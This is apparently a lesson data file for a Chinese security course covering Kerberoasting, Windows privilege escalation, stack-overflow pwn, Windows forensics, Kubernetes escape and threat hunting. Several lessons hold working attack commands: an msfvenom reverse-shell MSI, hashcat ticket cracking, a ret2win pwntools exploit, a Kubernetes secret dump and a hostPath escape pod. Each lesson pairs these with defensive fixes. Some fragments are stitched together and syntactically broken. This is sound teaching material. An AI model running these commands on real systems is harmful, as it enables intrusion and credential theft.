  quiz:{q:'服务端接受 alg:none 的 JWT，最直接的后果是？',
  opts:['token 会变得更大','攻击者可以不带签名任意伪造 payload，等于身份认证完全失效','token 无法解码','只能读取不能修改'],
  a:1, exp:'alg:none 意味着不验证签名，任何人都能构造任意 payload 通过校验。修复方式是服务端固定允许的算法，绝不采信 header 里的 alg。'},
  challenge:[
    '写一段 PHP 代码复现「属性可控 → __destruct → system」的完整链条，再给出两种修复方案并对比。',
    '用 Python 实现一个 JWT 签发/校验服务，故意留一个 alg 混淆漏洞，然后用脚本打穿它，最后打补丁。'

    {t:'SPN 与票据', d:'服务用 SPN 标识自己。任何域用户都能为某个 SPN 申请服务票据，而票据是用「服务账号的密码哈希」加密的——于是可以拿回去离线爆破。'},

  steps:[

hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt`,
     why:'为带 SPN 的账号申请票据，票据用该账号的 NTLM 哈希加密。拿回来离线爆破，不会触发账号锁定、也不产生登录失败日志——所以它是最隐蔽的 AD 攻击之一。',

hashcat -m 18200 asrep.hash rockyou.txt`,
     why:'如果账号关闭了「需要 Kerberos 预认证」，任何人不用密码就能拿到一段用其密码加密的数据，同样可以离线爆破。这是配置疏忽直接变成漏洞的典型。',

# Shortest Paths to Domain Admins from Owned Principals`,

  deep:[
    {t:'为什么票据能被离线爆破', d:'KDC 用服务账号的密钥加密票据，客户端拿到就能带走。破解在本地进行，域控完全看不到，所以「没有失败登录日志」并不代表没被攻击。'},

    {t:'为什么拿下 DC 就结束了', d:'DC 持有所有账号哈希（DCSync 可直接同步），控制 DC 等于可以伪造任意身份的票据（黄金票据），整个域的信任链都归你。'}

'm5': [
{
  id:'l5-3', title:'Windows 提权：令牌、服务与注册表里的机会', time:'50 分钟', level:'高级',
  tags:['Windows','提权','令牌','服务','winPEAS'],
  goal:[
    '用 whoami /priv 与 systeminfo 判断当前权限画像',
    '找出「未引用服务路径」与 AlwaysInstallElevated 两类经典配置漏洞',
    '理解为什么 Windows 提权大多是「配置问题」而不是「内核漏洞」'
  ],
  concepts:[
    {t:'令牌', d:'Windows 用访问令牌表示身份与特权。SeImpersonatePrivilege 这类特权可以被滥用成 SYSTEM（Potato 系列），所以「服务账号」天然危险。'},
    {t:'未引用服务路径', d:'服务路径写成 C:\\Program Files\\App\\svc.exe 却没加引号，Windows 会依次尝试 C:\\Program.exe、C:\\Program Files\\App.exe——你在这些位置放个同名程序，就以 SYSTEM 执行了。'},
    {t:'AlwaysInstallElevated', d:'组策略允许普通用户以高权限安装 msi，于是构造一个恶意 msi 就能拿到 SYSTEM。'}
  ],
  steps:[
    {title:'先画权限画像',
     cmd:`whoami /priv
whoami /groups
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
net user %USERNAME%`,
     why:'先看有没有 SeImpersonate、SeAssignPrimaryToken、SeBackup 这类高价值特权，再看系统补丁版本决定能不能打内核漏洞，最后看自己在哪些组（Backup Operators 也能读 SAM）。',
     out:'特权列表 + 系统版本 + 所属组。',
     hints:['SeImpersonatePrivilege 存在就先试 PrintSpoofer / GodPotato，成功率高、动静小。','补丁列表缺失的服务（如 MS16-032）对应一串可用 exploit。'],
     try:{need:['whoami','/priv'], hint:'查看当前令牌特权的命令。'}},
    {title:'未引用服务路径：把程序放到它「先找」的位置',
     cmd:`wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\"
# 或用 PowerUp：Get-UnquotedService`,
     why:'输出里带空格且没加引号的路径就是候选。你要确认那个「中间路径」目录你是否有写权限——有，就能放一个同名 exe，等服务重启时以 SYSTEM 身份执行。',
     out:'一条形如 C:\\Program Files\\Vuln App\\service.exe 的可疑路径。',
     hints:['用 accesschk 检查目录权限：accesschk.exe -uwdqs "C:\\Program Files"。','重启服务需要权限，通常要等系统重启或配合其他手段。']},
    {title:'AlwaysInstallElevated：两个注册表键都开就完事',
     cmd:`reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
# 两个都是 0x1 时：
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi`,
     why:'这是纯配置错误：只要两处都开启，任何用户安装 msi 都会以 SYSTEM 权限运行其中的自定义动作。你不需要漏洞，只需要一个「合法的安装包」。',
     out:'两个键都返回 0x1；执行 msi 后拿到 SYSTEM 的反弹 shell。',
     hints:['只有 HKCU 开启不算，必须是 HKLM 与 HKCU 同时开启。','这是 MSF 里最稳的提权模块之一：exploit/windows/local/always_install_elevated。']},
    {title:'让工具把剩下的翻完',
     cmd:`winPEASx64.exe > peas.txt
# 或 PowerUp：Invoke-AllChecks
# 关注：可写服务目录、计划任务、ModifiableServices、凭据文件`,
     why:'人工翻几十个点容易漏。winPEAS 会把服务权限、计划任务、注册表、凭据、补丁一次性列出来，并用颜色标风险。你的工作是复核最红的那几条，而不是从头读到尾。',
     out:'一份按风险排序的提权候选清单。',
     hints:['先看红色项，再看橙色项；蓝色多是信息性内容。','工具会留下文件，注意清理。']},
    {title:'防守：把「可写的路径」全部收掉',
     cmd:`# 1) 服务路径全部加引号，安装目录不给普通用户写权限
# 2) 关闭 AlwaysInstallElevated（两处都要关）
# 3) 服务账号降权，能不用 SYSTEM 就不用
# 4) AppLocker / WDAC 限制可执行位置`,
     why:'Windows 提权的绝大多数入口是「低权限用户能写一个会被高权限执行的位置」。把这个交集清空，攻击者就没有落脚点——这比追着每个 CVE 打补丁更根本。',
     out:'同样的提权尝试全部失败。',
     hints:['定期用 accesschk 扫描「Everyone 可写」的服务目录。','别给普通用户本地管理员，很多提权链从这一步就断了。']}
  ],
  deep:[
    {t:'为什么 SeImpersonate 等于半个 SYSTEM', d:'拥有模拟特权就能「借用」其他进程的令牌。Potato 系列通过本地 RPC 让 SYSTEM 进程来连接你，你模拟它，就变成了 SYSTEM。'},
    {t:'内核漏洞 vs 配置漏洞', d:'内核漏洞要匹配版本、容易蓝屏；配置漏洞稳定、可复现。真实项目里后者占比更高，也更值得先查。'},
    {t:'UAC 不是安全边界', d:'UAC 只是提示，不是权限隔离。管理员组的用户被 UAC 限制时，仍有大量 auto-elevate 的 COM 接口可被利用（UACME）。'}
  ],
  labs:[
    {name:'TryHackMe · Windows Privilege Escalation', task:'完成房间里的全部提权任务，每完成一个就写下「漏洞类型 + 关键命令 + 修复建议」。'},
    {name:'HackTheBox · 任选一台 Windows Easy', task:'从初始 shell 提到 Administrator，全程只用 3 个工具（winPEAS + 一个 exploit + 一个上传方式）。'},
    {name:'Metasploitable 3 (Windows)', task:'搭起来后练未引用服务路径与 AlwaysInstallElevated 两条链。'}
  ],
  pitfalls:[
    '一上来就打内核 exploit，蓝屏把靶机搞挂，还得重装。',
    '只看服务路径不看目录权限，白高兴一场。',
    '提权后立刻建账号，留下明显痕迹。'
  ],
  quiz:{q:'「未引用服务路径」漏洞成立的必要条件是？',
  opts:['服务以 SYSTEM 运行，且路径含空格未加引号，且低权限用户对某个中间路径有写权限','只要路径含空格即可','只要服务以 SYSTEM 运行即可','必须有内核漏洞配合'],
  a:0, exp:'三个条件缺一不可：高权限运行、路径可被拆分、你能在拆分出的某个位置写入同名程序。修复只需给路径加引号，但要彻底还得收掉写权限。'},
  challenge:[
    '写一个 PowerShell 脚本，自动找出所有「Auto 启动 + 路径含空格 + 无引号 + 中间目录可写」的服务。',
    '对比 winPEAS 与 PowerUp 的检测结果，统计各自的误报与漏报。'
  ]
}

'm6': [
{
  id:'l6-3', title:'Pwn 入门：从栈溢出到控制 RIP', time:'60 分钟', level:'高级',
  tags:['Pwn','栈溢出','pwntools','ROP'],
  goal:[
    '看懂栈帧布局与「覆盖返回地址」的原理',
    '用 cyclic 精确算出偏移量',
    '写出第一个 ret2win 利用脚本'
  ],
  concepts:[
    {t:'栈帧', d:'函数调用时，返回地址被压在栈上。局部缓冲区溢出会一路写上去，把返回地址覆盖成你想要的地址。'},
    {t:'偏移', d:'从缓冲区开头到返回地址的距离。算错一个字节，程序就跳到垃圾地址崩溃——所以要用 cyclic 图案精确定位。'},
    {t:'ret2win', d:'不开 NX 也能用、开了 NX 也能用：不注入 shellcode，而是直接返回到程序里已有的 win() 函数。Pwn 的第一课。'}
  ],
  steps:[
    {title:'先看保护，决定打法',
     cmd:`checksec --file=./vuln
file ./vuln`,
     why:'NX 开着就不能在栈上执行代码，得走 ROP；PIE 开着地址随机，需要泄露基址；Canary 开着要先绕过或泄露。保护组合决定了你接下来写哪种 exploit。',
     out:'一列 Yes/No：RELRO / Canary / NX / PIE。',
     hints:['ret2win 只需要「有 win 函数 + 能控制返回地址」，NX 和 PIE 关不关都能打。','32 位与 64 位传参方式不同，别混。'],
     try:{need:['checksec'], hint:'看二进制保护机制的工具。'}},
    {title:'找溢出点',
     cmd:`objdump -d ./vuln | grep -A20 "<main>:"
# 或 gdb 里 disassemble main，找 gets / strcpy / read 的调用`,
     why:'gets、strcpy、sprintf 不做长度检查，是最经典的溢出源。看到 gets 就基本可以确定：缓冲区多大、要覆盖多少字节，都能从反汇编里读出来。',
     out:'一个栈缓冲区大小，例如 sub rsp, 0x40。',
     hints:['32 位下 buffer 到 ebp 的距离 + 4 字节 saved ebp 就是偏移。','64 位还要考虑 rbp，通常是 buffer 大小 + 8。']},
    {title:'用 cyclic 算出精确偏移',
     cmd:`gdb -q ./vuln
(gdb) cyclic 200
(gdb) run            # 输入那串图案
(gdb) info registers rip
(gdb) cyclic -l 0x6161616c`,
     why:'cyclic 生成一段「每 4 字节都不重复」的图案，崩溃时 RIP 里的值就能反查出它在图案中的位置——那就是偏移量。这是 Pwn 里最重要的一次测量。',
     out:'一个数字，例如 72，表示第 73 个字节开始覆盖返回地址。',
     hints:['装 pwndbg 后崩溃会直接提示 offset，省一步。','32 位看 EIP，64 位看 RIP。'],
     try:{need:['cyclic'], hint:'pwndbg / pwntools 里生成定位图案的命令。'}},
    {title:'写第一个 exploit',
     cmd:`from pwn import *
elf = ELF('./vuln')
p = process('./vuln')
payload = b'A'*72 + p64(elf.symbols['win'])
p.sendline(payload)
p.interactive()`,
     why:'72 个填充字节走完缓冲区，第 73 字节起就是返回地址，把它换成 win 的地址。程序 ret 时就跳到 win，你就拿到了 shell 或 flag。',
     out:'打印出 win 函数里的内容，或直接得到 shell。',
     hints:['p64 是 8 字节小端打包，32 位用 p32。','地址里有 0x0a 会被换行截断，必要时换输入方式（send 而不是 sendline）。'],
     try:{need:['p64'], hint:'pwntools 里打包 64 位地址的函数。'}},
    {title:'为什么 ret2win 开了 NX 也照样成立',
     cmd:`# NX 只禁止「执行栈上的数据」，不禁止「跳到已有代码」
# 返回到程序自带的 system("/bin/sh") 或 win() 完全合法`,
     why:'很多人以为 NX 让 Pwn 变难了，其实 NX 只堵住「注入 shellcode」这一条路。代码复用（ret2win、ROP）利用的是程序自身的指令，NX 管不着——这就是为什么 ROP 成为主流。',
     out:'能解释 NX / PIE / Canary 各自堵住了哪条路。',
     hints:['PIE 才是真正麻烦的那个，它让地址每次运行都变，必须先泄露。','Canary 需要先泄露或暴力猜（fork 服务可以逐字节爆破）。']},
    {title:'防守：编译选项与运行时防护',
     cmd:`gcc -fstack-protector-strong -fPIE -pie -Wl,-z,relro,-z,now -D_FORTIFY_SOURCE=2
# 再配合 ASLR 与 seccomp 白名单`,
     why:'编译期加保护、运行期加沙箱，两层叠加能挡住绝大多数入门级 Pwn。真正的工业级防御还要有 CFI、内存安全语言（Rust）这类结构性方案。',
     out:'同样的 exploit 在新编译版本上失败。',
     hints:['-D_FORTIFY_SOURCE=2 能把 gets 这类函数直接编译报错。','不要把「能打通」当成「系统不安全」，要看目标环境开了什么。']}
  ],
  deep:[
    {t:'为什么 64 位要 8 字节对齐', d:'x86-64 的栈按 16 字节对齐，movaps 指令遇到未对齐会崩。写 ROP 时经常要多加一个 ret 做对齐，这是新手最常见的「本地能通、远程崩」。'},
    {t:'Canary 的两条绕过思路', d:'泄露（格式化字符串、越界读）或爆破（fork 子进程 canary 不变，可逐字节猜，最多 7×256 次）。'},
    {t:'从 ret2win 到 ROP 的跨越', d:'当没有现成的 win 函数时，用一个个 ret 结尾的小片段（gadget）拼出 pop rdi; ret 加 system 加 /bin/sh 的调用序列——本质是「用已有指令编程」。'}
  ],
  labs:[
    {name:'ROP Emporium · ret2win', task:'下载 32 位与 64 位两个版本，各写一份 pwntools 脚本，理解两者偏移与打包的差异。'},
    {name:'pwn.college · Program Misuse / Memory Safety', task:'完成前两个模块，用课程环境练 gdb 与内存布局。'},
    {name:'本地练习', task:'自己写一个带 gets 的 C 程序，编译两次（开/关保护），分别打通并对比。'}
  ],
  pitfalls:[
    '偏移算成缓冲区大小，忘了 saved rbp，永远差 8 字节。',
    '本地打通远程崩，多数是栈对齐或 libc 版本不同。',
    '不关 ASLR 就本地调试，地址每次都变。'
  ],
  quiz:{q:'开启 NX 之后，为什么 ret2win 依然能成功？',
  opts:['因为 NX 只对 32 位有效','因为 NX 只禁止执行栈上的数据，而 ret2win 是跳转到程序已有的代码','因为 NX 可以被 gdb 关闭','因为 ret2win 不修改返回地址'],
  a:1, exp:'NX 阻止的是「把数据当代码执行」，代码复用攻击用的是程序自身的指令段，不受影响。这也是 ROP 成为主流的原因。'},
  challenge:[
    '把 ret2win 升级成 ret2libc：没有 win 函数时，泄露 libc 基址，再调用 system("/bin/sh")。',
    '给练习程序加上 Canary，写脚本用逐字节爆破绕过（fork 模式）。'
  ]
}

'm7': [
{
  id:'l7-3', title:'Windows 取证：注册表、事件日志与执行痕迹', time:'45 分钟', level:'高级',
  tags:['Windows','注册表','EVTX','ShimCache'],
  goal:[
    '离线挂载注册表 hive 并定位持久化项',
    '解析关键事件 ID，重建登录与进程执行记录',
    '用 ShimCache / Amcache 证明「某程序确实运行过」'
  ],
  concepts:[
    {t:'Hive', d:'注册表在磁盘上是几个文件：SAM、SYSTEM、SOFTWARE、NTUSER.DAT。拷贝出来就能离线分析，不需要启动系统。'},
    {t:'关键事件 ID', d:'4624 登录成功、4625 失败、4688 进程创建、7045 服务安装、1102 日志被清空。这几个 ID 撑起攻击时间线的主干。'},
    {t:'执行痕迹', d:'ShimCache 记录「存在过/可能执行过」，Amcache 记录「安装/首次运行」，Prefetch 记录「运行过几次、加载了哪些文件」。三者互补。'}
  ],
  steps:[
    {title:'先把 hive 拷出来，离线挂载',
     cmd:`reg save HKLM\\SYSTEM C:\\case\\SYSTEM.hiv
reg load HKLM\\CASE_SYS C:\\case\\SYSTEM.hiv
reg query HKLM\\CASE_SYS\\ControlSet001\\Services /s | findstr /i "ImagePath"
reg unload HKLM\\CASE_SYS`,
     why:'reg save 可以做在线导出（取证时注意会改动少量元数据，严谨场景用镜像离线取）。reg load 让你在分析机上像读本地注册表一样读它——服务、驱动、启动项全在里面。',
     out:'一份服务与驱动的 ImagePath 列表，异常路径往往就在里面。',
     hints:['镜像环境用 Registry Explorer 更安全，不会改动原始文件。','CurrentControlSet 对应 ControlSet001，别找错分支。']},
    {title:'看持久化：Run 键、服务、计划任务',
     cmd:`# 常见位置
HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
HKLM\\SYSTEM\\CurrentControlSet\\Services
C:\\Windows\\System32\\Tasks\\`,
     why:'攻击者要「重启后还在」，就必须落在这些位置之一。检查思路是「对比基线」：干净镜像里有哪些项，现在多了哪些。多出来的那条通常就是答案。',
     out:'一条指向临时目录或混淆命名的启动项。',
     hints:['注意同名但路径奇怪的项，比如 svch0st.exe。','服务的 ImagePath 指向 C:\\Users\\Public 是强信号。']},
    {title:'事件日志：把行为串成时间线',
     cmd:`wevtutil epl Security C:\\case\\security.evtx
# 用 EvtxECmd 或 python-evtx 解析后过滤：
# 4624 登录（关注 LogonType 3/10）
# 4688 进程创建（看父进程与命令行）
# 7045 服务安装（新服务名 + 可疑路径）`,
     why:'4688 加上命令行审计，几乎就是「谁在什么时候运行了什么」。7045 是新服务被安装——很多持久化和提权都走这条路。4624 的 LogonType 能区分本地登录、网络登录、远程桌面。',
     out:'一张按时间排序的登录与进程创建表。',
     hints:['命令行审计默认不开，需要组策略启用，取证时要先确认有没有数据。','1102 出现表示日志被清空，这本身就是一条高价值线索。']},
    {title:'证明「这个程序跑过」',
     cmd:`# ShimCache：SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache
# Amcache：C:\\Windows\\AppCompat\\Programs\\Amcache.hve
# Prefetch：C:\\Windows\\Prefetch\\*.pf
PECmd.exe -d C:\\Windows\\Prefetch --csv C:\\case\\prefetch`,
     why:'攻击者可以删除 exe，但很难同时清掉这三处痕迹。Prefetch 还带运行次数与最后运行时间，是「是否执行」最直接的证据。',
     out:'程序名、路径、运行次数、最后运行时间。',
     hints:['Prefetch 默认开启，SSD 环境下可能被禁用，别因为看不到就以为没运行。','Amcache 还带文件哈希，可以直接拿去威胁情报比对。']},
    {title:'输出：一份能被人看懂的取证结论',
     cmd:`# 结论格式：时间 | 主机 | 行为 | 证据来源 | 置信度
# 例：2026-10-30 02:14 | WS-01 | 安装可疑服务 UpdaterSvc | 7045 + Services 注册表 | 高`,
     why:'取证的价值不在于你找到了多少 artifact，而在于能否用证据回答「发生了什么、影响多大、还会不会再来」。每条结论都要能指回原始证据。',
     out:'一份含时间线与证据引用的简短报告。',
     hints:['置信度分级能帮读者理解不确定性，别把推测写成事实。','把关键截图的哈希记下来，防止被质疑篡改。']}
  ],
  deep:[
    {t:'为什么时间戳不可全信', d:'攻击者可以用 timestomp 改文件时间。所以要交叉验证：注册表、日志、Prefetch 三处时间一致才可信。'},
    {t:'Volume Shadow Copy 的价值', d:'卷影副本里可能保留入侵前的干净版本，既能找回被删文件，也能做「前后对比」——这是最有力的取证手段之一。'},
    {t:'日志被清空怎么办', d:'转向 Sysmon、EDR、网络设备日志、以及文件系统痕迹（USN Journal）。单一数据源永远不够。'}
  ],
  labs:[
    {name:'CyberDefenders · Windows 内存/磁盘挑战', task:'任选一个 Windows 取证挑战，输出完整时间线与 5 条结论，每条附证据来源。'},
    {name:'Blue Team Labs Online · Phishing/Endpoint', task:'完成一个终端分析挑战，重点练 4688 与 Prefetch 的交叉验证。'},
    {name:'自建实验', task:'在 Win10 虚拟机里用 PowerShell 起一个计划任务，然后只用注册表 + 事件日志 + Prefetch 把这次操作还原出来。'}
  ],
  pitfalls:[
    '只看一个数据源就下结论，被 timestomp 骗过。',
    '忘记时区，时间线整体偏移 8 小时。',
    '直接在生产机器上跑解析工具，破坏原始证据。'
  ],
  quiz:{q:'要证明「某个 exe 确实被执行过」，最有力的组合是？',
  opts:['文件还在磁盘上','Prefetch 运行记录 + 4688 进程创建 + ShimCache/Amcache 交叉印证','文件名看起来可疑','杀毒软件报过警'],
  a:1, exp:'文件存在不等于执行过。Prefetch 给运行次数与时间，4688 给进程链，ShimCache/Amcache 给存在与安装痕迹，三者交叉才能下结论。'},
  challenge:[
    '写一个 PowerShell 脚本，自动从 hive 中导出所有 Run 键与服务项，并与一份基线清单做 diff。',
    '拿一个公开的取证镜像，用 EvtxECmd + PECmd + Registry Explorer 独立还原攻击链，再和官方答案对比差异。'
  ]
}
],
'm8': [
{
  id:'l8-3', title:'Kubernetes 安全：从一个 Pod 到整个集群', time:'50 分钟', level:'高级',
  tags:['K8s','ServiceAccount','RBAC','逃逸'],
  goal:[
    '理解 ServiceAccount Token 为什么是集群里的「万能钥匙」',
    '用 token 调 API 枚举权限、读 Secret',
    '说清 hostPath / privileged 如何从 Pod 逃到节点'
  ],
  concepts:[
    {t:'SA Token', d:'每个 Pod 都会自动挂载一个 token，代表它的身份。token 的权限由 RBAC 决定——但很多默认配置给得太宽。'},
    {t:'RBAC', d:'Role/ClusterRole 定义「能对什么资源做什么动作」。一个 list secrets 权限就等于能读全集群的密码。'},
    {t:'Pod 逃逸', d:'privileged、hostPath 挂载 /、hostPID/hostNetwork，都会让容器看到并影响宿主机。容器不是沙箱。'}
  ],
  steps:[
    {title:'进 Pod 第一件事：看自己是谁',
     cmd:`cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
env | grep KUBERNETES`,
     why:'token 就是身份凭证。拿到它，你就不在容器里了——你在集群的 API 里。先确认命名空间，再确认能用这个 token 做什么。',
     out:'一段 JWT 形式的 token，以及当前 namespace。',
     hints:['token 是 JWT，可以解出 iss 与 sub 看它属于哪个 SA。','新版集群可能用投射卷，路径略有不同。'],
     try:{need:['serviceaccount'], hint:'默认凭证挂载目录在 /var/run/secrets/ 下。'}},
    {title:'用 token 问 API：我能做什么',
     cmd:`TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \\
  -H "Authorization: Bearer $TOKEN" $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \\
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'`,
     why:'SelfSubjectRulesReview 直接告诉你「这个身份能对哪些资源做哪些动作」。比盲试快得多，也不会产生大量失败审计日志。',
     out:'一份规则列表，可能包含 get/list secrets、create pods 等高危权限。',
     hints:['能 create pods 就能起一个挂载 hostPath 的 Pod，等于拿到节点。','能 list secrets 就直接把全集群凭据读走。']},
    {title:'读 Secret：集群里的密码本',
     cmd:`curl -s -H "Authorization: Bearer $TOKEN" \\
  $APISERVER/api/v1/namespaces/default/secrets | head -40
# 单个 secret：
curl -s -H "Authorization: Bearer $TOKEN" \\
  $APISERVER/api/v1/namespaces/default/secrets/db-secret -o s.json
cat s.json | python3 -c "import sys,json,base64;d=json.load(sys.stdin)['data'];print({k:base64.b64decode(v).decode() for k,v in d.items()})"`,
     why:'Secret 只是 base64，不是加密。任何有读权限的身份都能还原出明文——数据库密码、API Key、TLS 私钥都在这里。所以「谁能读 Secret」是集群里最关键的权限边界。',
     out:'一组明文凭据。',
     hints:['有些集群开了 etcd 加密，那是另一层保护，但 API 层读出来仍是明文。','注意 400/403 的区别：403 是权限不足，400 是请求格式错。']},
    {title:'从 Pod 到节点：两条常见逃逸路',
     cmd:`# 1) hostPath 挂载 /
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: p
    image: alpine
    command: ["/bin/sh","-c","chroot /host sh"]
    volumeMounts:
    - name: h
      mountPath: /host
  volumes:
  - name: h
    hostPath: {path: /}
EOF
# 2) privileged + nsenter 进宿主命名空间`,
     why:'只要你能创建 Pod 并挂载宿主目录，就能 chroot 到节点文件系统，读取 kubelet 凭据、其他容器数据，甚至控制整个节点。这已经不是「容器漏洞」，是权限设计问题。',
     out:'在 Pod 里看到节点根文件系统，或直接进入宿主命名空间。',
     hints:['PSA（Pod Security Admission）设为 restricted 就能挡住这类 Pod。','privileged 容器里可以直接 mount 宿主磁盘。']},
    {title:'防守：把「默认宽权限」改成「显式最小」',
     cmd:`# 1) automountServiceAccountToken: false（不需要 API 的 Pod）
# 2) RBAC 按命名空间授权，禁止 cluster-admin 泛滥
# 3) PSA restricted：禁止 privileged / hostPath / root
# 4) NetworkPolicy 默认拒绝，Secret 开 etcd 加密
# 5) 开审计日志，监控 exec / create pods / secrets 访问`,
     why:'K8s 的默认值偏向「能用」，不是「安全」。所以防守是一系列显式收窄：关掉不需要的 token、按命名空间授权、用策略拒绝危险 Pod。审计日志则让你事后能回答「谁在什么时候读了 secret」。',
     out:'同样的逃逸尝试被准入策略拒绝。',
     hints:['先盘点有多少 SA 绑定了 cluster-admin，这个数字通常吓人。','别只做网络策略，RBAC 才是权限边界。']}
  ],
  deep:[
    {t:'为什么 token 泄露等于集群沦陷', d:'token 是长期有效的身份凭证（旧版本不过期），拿到就能在集群内以该身份任意调用 API，不依赖网络位置。'},
    {t:'容器隔离的边界在哪', d:'共享内核意味着内核漏洞可以跨容器；而 privileged / hostPath 是「主动把边界拆掉」，比漏洞更容易被利用。'},
    {t:'为什么 PSA 比自定义 webhook 更该先上', d:'内置、零维护、覆盖最常见的危险配置。自定义准入控制用于补充业务规则，不该拿来做基础防护。'}
  ],
  labs:[
    {name:'Kubernetes Goat', task:'完成 3 个场景：SA token 滥用、RBAC 越权、hostPath 逃逸，每个都写下「前提条件 + 修复配置」。'},
    {name:'Killercoda · K8s 免费集群', task:'在在线集群里创建一个受限 SA，验证它在别的命名空间读 secret 会被拒绝。'},
    {name:'自建 k3s', task:'装一个单节点 k3s，故意配一个 cluster-admin 的 SA，然后用 token 从 Pod 内读全集群 secret。'}
  ],
  pitfalls:[
    '把 kubeconfig 提交到 Git 仓库，等于把集群钥匙公开。',
    '给所有 CI 用的 SA 绑 cluster-admin，图省事。',
    '只做网络策略，不做 RBAC，权限照样越界。'
  ],
  quiz:{q:'Pod 内的 ServiceAccount Token 泄露后，最严重的直接后果是？',
  opts:['容器会重启','攻击者可以以该身份调用 K8s API，按 RBAC 权限读 Secret 或创建 Pod','节点会宕机','镜像会被删除'],
  a:1, exp:'token 是集群内的身份凭证。权限多大，危害就多大——能读 Secret 就等于拿到全集群凭据，能建 Pod 就可能逃逸到节点。'},
  challenge:[
    '写一个脚本：给定 token，自动枚举权限并输出「最高危的三条路径」。',
    '用 OPA Gatekeeper 写一条策略，禁止任何带 hostPath 的 Pod，并验证它能拦住你之前的逃逸 YAML。'
  ]
}
],
'm9': [
{
  id:'l9-3', title:'威胁狩猎：在没有告警的地方找攻击', time:'45 分钟', level:'高级',
  tags:['ATT&CK','威胁狩猎','Sigma','KQL'],
  goal:[
    '用 ATT&CK 把「我要找什么」变成一个可执行假设',
    '从数据源出发写出第一条狩猎查询',
    '把一次狩猎的产出沉淀成可复用的检测规则'
  ],
  concepts:[
    {t:'狩猎 vs 监控', d:'监控是「等规则响」，狩猎是「假设有人已经进来了，主动去找证据」。前者依赖已知，后者面向未知。'},
    {t:'假设驱动', d:'好假设长这样：攻击者可能用 certutil 下载 payload，因为它是系统自带、不易被杀。然后去找 certutil 的异常调用。'},
    {t:'ATT&CK', d:'把攻击拆成战术（为什么）与技术（怎么做）。它给你一张地图，避免只盯某几个 IoC。'}
  ],
  steps:[
    {title:'从一个技术开始，而不是从日志开始',
     cmd:`# 选一个技术，例如 T1105 Ingress Tool Transfer
# 问三个问题：它会留下什么痕迹？哪些数据源能看到？正常行为长什么样？`,
     why:'一上来就翻日志会淹死。先锁定技术，再反推数据源，搜索范围立刻收窄。ATT&CK 的每个技术页都列了 Detection 建议，是最好的起点。',
     out:'一句可验证的假设：攻击者可能用 certutil -urlcache 下载工具。',
     hints:['挑「高价值 + 数据充足」的技术先做，比如 PowerShell、计划任务、服务安装。','别一次挑十个，一周做一个技术就很好。']},
    {title:'确认数据源够不够',
     cmd:`# Windows：Sysmon（1 进程创建、3 网络、11 文件、13 注册表）
# Linux：auditd、bash history、journald
# 网络：Zeek、DNS 日志、代理日志
# 云：CloudTrail / 操作审计`,
     why:'没有数据就没有狩猎。先确认「这个技术的行为会不会被记录」，再写查询——否则你查半天没结果，其实是因为根本没采集。',
     out:'一张「技术 → 数据源 → 是否已采集」的对照表。',
     hints:['Sysmon 的配置决定一切，默认配置漏很多。','云上先确认审计日志是开着的，很多事故后发现压根没开。']},
    {title:'写查询：从粗到细',
     cmd:`# KQL（Defender / Sentinel）示例
DeviceProcessEvents
| where FileName in~ ("certutil.exe","bitsadmin.exe")
| where ProcessCommandLine has_any ("urlcache","http://","https://")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine`,
     why:'先用「程序名 + 可疑参数」粗筛，再看结果里的正常业务，逐步加排除条件。一次就写出完美查询是不现实的，狩猎本身就是迭代。',
     out:'一个能跑出结果、且结果量在可人工复核范围内的查询。',
     hints:['结果太多就加 has_any 限定，太少就去掉一个条件。','把「正常」的例子记下来，它们是你下一条排除条件。']},
    {title:'验证：真阳性还是噪音',
     cmd:`# 对每条命中问：
# 1) 这个命令行在这台机器上合理吗？
# 2) 父进程是谁？时间点是否异常？
# 3) 有没有后续网络连接或文件落地？`,
     why:'狩猎的产出不是「一堆命中」，而是「几条被证实的结论」。没有上下文的单条日志几乎总是误报，必须横向关联。',
     out:'一份标注了真/假阳性的结果表。',
     hints:['关注「开发机上的运维脚本」这类高频误报源。','把误报原因写下来，它们会变成规则的排除项。']},
    {title:'沉淀：把狩猎变成检测',
     cmd:`# 把验证过的逻辑写成 Sigma 规则，转成各平台查询
title: Suspicious Certutil Download
logsource: {product: windows, category: process_creation}
detection:
  selection: {Image|endswith: '\\certutil.exe', CommandLine|contains: 'urlcache'}
  condition: selection
level: medium`,
     why:'一次狩猎只解决一次问题；写成规则才能持续生效。Sigma 是厂商无关的规则格式，写一次可以转成 Splunk、Elastic、Sentinel 的查询。',
     out:'一条可部署的检测规则 + 一条对应的 ATT&CK 映射。',
     hints:['规则要写清楚误报场景，否则运维会关掉它。','上线后跟踪命中率，两周没人处理就说明规则设计有问题。']}

  topics:[
    {id:'t1',ic:'🧬',cat:'Web',lv:'D3',time:'45 分钟',
     title:'HTTP 报文是怎么被切分的：请求走私的真正根因',
     q:'同一段字节，前端看到 1 条请求，后端却看到 2 条——差异出在解析器，不在 payload。',
     body:[
      {h:'1. 消息边界靠什么确定',p:'HTTP/1.1 是流式协议，没有帧头。接收方只能靠两个头部之一确定 body 长度：Content-Length（字节数）或 Transfer-Encoding: chunked（分块，每块自带长度）。规范要求：两者同时出现时，Transfer-Encoding 优先，并且应当直接拒绝这种消息。'},
